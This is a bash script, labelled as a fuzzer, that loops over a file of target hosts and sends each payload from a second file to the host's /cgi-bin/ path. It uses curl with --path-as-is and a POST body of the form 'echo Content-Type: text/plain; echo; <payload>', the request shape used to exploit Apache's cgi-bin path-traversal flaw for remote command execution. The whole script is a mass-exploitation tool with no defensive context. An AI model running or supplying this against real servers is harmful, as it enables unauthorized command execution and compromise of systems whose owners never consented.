#!/bin/bash

# Check if the targets file (targets.txt) is provided
if [[ -z $1 ]]; then
  echo "Please provide the targets file (targets.txt)!"
  exit 1
fi

# Check if the payloads file (fuzzing_payloads.txt) exists
if [[ ! -f fuzzing_payloads.txt ]]; then
  echo "Payloads file (fuzzing_payloads.txt) not found!"
  exit 1
fi

# Read the targets file line by line and treat each line as a target host
while IFS= read -r host; do
  echo "Testing host: $host"
  
  # Iterate over each payload in the fuzzing_payloads.txt file
  while IFS= read -r fuzz; do
    echo "Sending payload: $fuzz"
    
    # Send the request using curl with the target host and the payload
    curl -k -s --path-as-is -d "echo Content-Type: text/plain; echo; $fuzz" "$host/cgi-bin/$fuzz"
    
  done < fuzzing_payloads.txt
  
done < "$1"

echo "Fuzzing complete!"